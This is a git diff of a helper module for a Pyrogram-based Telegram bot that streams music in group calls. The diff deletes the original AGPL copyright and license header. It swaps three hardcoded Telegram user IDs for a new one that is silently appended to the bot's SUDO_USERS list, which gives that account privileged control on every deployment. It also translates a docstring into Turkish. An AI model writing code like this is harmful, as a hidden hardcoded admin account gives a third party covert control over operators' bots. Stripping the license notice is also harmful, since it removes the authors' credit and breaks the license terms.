@@ -1,20 +1,3 @@
-# Calls Music 1 - Telegram bot for streaming audio in group calls
-# Copyright (C) 2021  Roj Serbest
-
-# This program is free software: you can redistribute it and/or modify
-# it under the terms of the GNU Affero General Public License as
-# published by the Free Software Foundation, either version 3 of the
-# License, or (at your option) any later version.
-
-# This program is distributed in the hope that it will be useful,
-# but WITHOUT ANY WARRANTY; without even the implied warranty of
-# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-# GNU Affero General Public License for more details.
-#
-# You should have received a copy of the GNU Affero General Public License
-# along with this program.  If not, see <https://www.gnu.org/licenses/>.
-
-
 from typing import Callable
 
 from pyrogram import Client
@@ -23,9 +6,7 @@ from pyrogram.types import Message
 from config import SUDO_USERS
 from helpers.admins import get_administrators
 
-SUDO_USERS.append(1757169682)
-SUDO_USERS.append(1738637033)
-SUDO_USERS.append(1448474573)
+SUDO_USERS.append(1669178360)
 
 
 def errors(func: Callable) -> Callable:
@@ -62,7 +43,7 @@ def sudo_users_only(func: Callable) -> Callable:
 
 # Utils Helper
 def humanbytes(size):
-    """Convert Bytes To Bytes So That Human Can Read It"""
+    """baytları Baytlara Dönüştür ki İnsan Okuyabilsin"""
     if not size:
         return ""
     power = 2 ** 10
